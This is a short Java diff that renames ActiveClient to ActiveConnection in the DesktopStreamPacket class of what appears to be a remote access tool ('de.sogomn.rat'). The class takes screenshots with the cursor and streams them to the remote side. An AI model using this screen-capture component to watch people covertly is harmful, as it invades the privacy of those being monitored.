@@ -5,7 +5,7 @@ import java.util.ArrayList;
 import java.util.stream.Stream;
 
 import de.sogomn.engine.util.ImageUtils;
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.util.FrameEncoder;
 import de.sogomn.rat.util.FrameEncoder.IFrame;
 
@@ -34,12 +34,12 @@ public final class DesktopStreamPacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void sendRequest(final ActiveClient client) {
+	protected void sendRequest(final ActiveConnection client) {
 		client.writeByte(deleteLastScreenshot);
 	}
 	
 	@Override
-	protected void sendData(final ActiveClient client) {
+	protected void sendData(final ActiveConnection client) {
 		Stream.of(frames).forEach(frame -> {
 			final byte[] data = ImageUtils.toByteArray(frame.image, 0);
 			
@@ -56,12 +56,12 @@ public final class DesktopStreamPacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void receiveRequest(final ActiveClient client) {
+	protected void receiveRequest(final ActiveConnection client) {
 		deleteLastScreenshot = client.readByte();
 	}
 	
 	@Override
-	protected void receiveData(final ActiveClient client) {
+	protected void receiveData(final ActiveConnection client) {
 		final ArrayList<IFrame> framesList = new ArrayList<IFrame>();
 		
 		while (client.readByte() == INCOMING) {
@@ -84,7 +84,7 @@ public final class DesktopStreamPacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void executeRequest(final ActiveClient client) {
+	protected void executeRequest(final ActiveConnection client) {
 		final BufferedImage screenshot = FrameEncoder.takeScreenshotWithCursor();
 		
 		if (deleteLastScreenshot == DELETE || lastScreenshot == null) {
@@ -107,7 +107,7 @@ public final class DesktopStreamPacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void executeData(final ActiveClient client) {
+	protected void executeData(final ActiveConnection client) {
 		//...
 	}
 	
